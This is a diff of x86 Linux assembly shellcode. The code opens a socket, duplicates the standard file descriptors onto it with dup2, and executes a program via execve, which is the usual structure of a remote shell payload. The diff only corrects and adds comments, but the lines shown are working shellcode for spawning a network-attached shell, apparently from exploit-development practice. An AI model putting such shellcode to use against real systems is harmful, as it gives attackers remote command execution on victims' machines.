@@ -16,7 +16,7 @@ global _start
 
 _start:
 	; Obtain an AF_INET socket
-	xor eax, eax
+	xor eax, eax		; initial register cleanup
 	xor ebx, ebx
 	xor ecx, ecx
 	mov ax, SYS_SOCKET	; syscall
@@ -44,7 +44,7 @@ _start:
 	xor ecx, ecx
 	mov cl, 3		; start at STDERR+1 and go down
 next_dup:
-	mov al, SYS_DUP2        ; syscall. first param oldfd already in EB
+	mov al, SYS_DUP2        ; syscall. first param oldfd already in EBX
 	dec ecx
 	int 0x80
 	jnz short next_dup	; keep going until we've run it for ecx = 0
@@ -58,7 +58,7 @@ next_dup:
 	push ecx		; null terminator of array = envp array
 	mov edx, esp		; edx = ptr to envp
 	push ebx      		; After this, esp = start of argv array
-	mov ecx, esp		; edx = ptr to argv
+	mov ecx, esp		; ecx = ptr to argv
 
 	mov al, SYS_EXECVE	; syscall
 	int 0x80
